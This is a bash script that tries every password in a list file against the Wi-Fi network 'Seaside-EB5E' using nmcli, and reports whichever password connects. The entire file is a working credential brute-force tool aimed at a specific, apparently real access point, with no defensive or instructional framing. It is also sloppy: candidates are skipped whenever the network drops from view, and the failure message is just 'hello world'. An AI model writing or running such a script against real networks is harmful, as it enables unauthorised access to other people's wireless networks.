#!/bin/bash

# Define the SSID of the Wi-Fi network
SSID="Seaside-EB5E"

# Define the file that contains the list of passwords
PASSWORD_FILE="passwords.txt"

# Check if the password file exists
if [[ ! -f "$PASSWORD_FILE" ]]; then
    echo "Password file '$PASSWORD_FILE' not found!"
    exit 1
fi

# Flag to check if connection was successful
connected=false

# Function to check if SSID is available
function is_ssid_available() {
    nmcli -t -f SSID dev wifi | grep -q "^$SSID$"
    return $?
}

# Main connection loop
while IFS= read -r PASSWORD; do
    # Check if the SSID is available
    if ! is_ssid_available; then
        echo "Network '$SSID' is not visible. Refreshing Wi-Fi list..."
        nmcli dev wifi rescan
        sleep 5
        continue
    fi

    echo "Trying password: $PASSWORD"

    # Attempt to connect to the Wi-Fi network with the current password
    nmcli dev wifi connect "$SSID" password "$PASSWORD"

    # Check if the connection was successful
    if [[ $? -eq 0 ]]; then
        echo "Connected successfully to $SSID with password '$PASSWORD'"
        connected=true
        break  # Exit the loop if connected
    else
        echo "Connection failed with password '$PASSWORD'"
        sleep 2  # Wait 2 seconds before trying the next password
    fi
done < "$PASSWORD_FILE"

# If none of the passwords worked
if [[ "$connected" = false ]]; then
    echo "hello world"
fi

